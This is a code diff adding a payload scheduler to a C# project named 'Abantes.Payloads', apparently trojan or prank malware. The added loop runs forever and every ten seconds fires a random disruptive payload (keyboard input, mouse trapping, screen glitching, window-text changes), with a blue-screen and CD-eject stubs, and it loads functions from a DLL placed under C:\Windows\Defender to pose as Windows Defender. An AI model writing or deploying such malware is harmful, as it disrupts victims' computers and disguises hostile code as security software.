@@ -18,6 +18,57 @@ namespace Abantes.Payloads
 {
     class Threads
     {
+        static Random _random = new Random();
+        public static void MainPayloadThread()
+        {
+            while(true)
+            {
+                switch (_random.Next(10))
+                {
+                    case 0:
+                        Thread randomOSsound = new Thread(new ThreadStart(Anoying.RandomOSSounds));
+                        randomOSsound.Start();
+                        break;
+                    case 1:
+                        Thread randomKeyboard = new Thread(new ThreadStart(Anoying.RandomKeyboard));
+                        randomKeyboard.Start();
+                        break;
+                    case 2:
+                        if (_random.Next(100) > 50)
+                        {
+                            //BSOD
+                        }
+                        break;
+                    case 3:
+                        //string extractPath = @"C:\Windows\Defender";
+                        //Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
+                        break;
+                    case 4:
+                        if (_random.Next(100) > 50)
+                        {
+                            Thread mouseTrap = new Thread(new ThreadStart(Anoying.MouseTrap));
+                            mouseTrap.Start();
+                        }
+                        break;
+                    case 5:
+                        Anoying.ChangeWindowText();
+                        break;
+                    case 6:
+                        //Anoying.EjectCd();
+                        break;
+                    case 7:
+                        Anoying.Screen_Screw();
+                        break;
+                    case 8:
+                        Anoying.Screen_Glitching();
+                        break;
+                    case 9:
+                        //Anoying.Display_Icons_Error();
+                        break;
+                }
+                Thread.Sleep(10000);
+            }
+        }
         public static void WathcDogThread()
         {
             WatchDog.Rules("Rules");
@@ -41,6 +92,10 @@ namespace Abantes.Payloads
         public static extern void Screen_Screw();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
         public static extern void Screen_Glitching();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EjectCD@Payloads@1@QAEXXZ")]
+        public static extern void EjectCd();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
+        public static extern void Display_Icons_Error();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
